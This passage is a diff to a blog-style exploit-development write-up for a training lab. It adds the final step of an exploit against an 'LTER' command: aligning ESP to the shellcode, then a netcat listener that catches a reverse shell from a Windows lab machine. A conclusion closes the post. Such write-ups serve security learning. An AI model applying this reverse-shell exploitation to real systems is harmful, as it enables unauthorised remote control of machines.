@@ -525,6 +525,26 @@ print s.recv(1024)
 s.close()
 ```
 
+The last check is we'll step through everything one last time to make sure that `ESP` is pointed right at the start of our shellcode before the first instruction of the shellcode executes. 
+
+![](/assets/images/CTP/espTRUE.JPG)
+
+It's aligned perfectly and we catch a reverse shell!
+```terminal_session
+astrid:~/ # nc -lvp 443                                                                                                                [20:11:10]
+listening on [any] 443 ...
+192.168.1.201: inverse host lookup failed: Unknown host
+connect to [192.168.1.206] from (UNKNOWN) [192.168.1.201] 49262
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\IEUser\Desktop>
+```
+
+## Conclusion
+Lots of sleep lost on this 'LTER' command but I think it was all worth it. As with anything you're new to it takes a lot of time investment to get any better. Once again huge thanks to @doylersec for all of his help and to @ihack4falafel for his help as well. 
+
+It was extremely gratifying to pull of my own version of the exploit using the technique I spent all day learning. Thanks for reading!
 
 ## Big Thanks
 
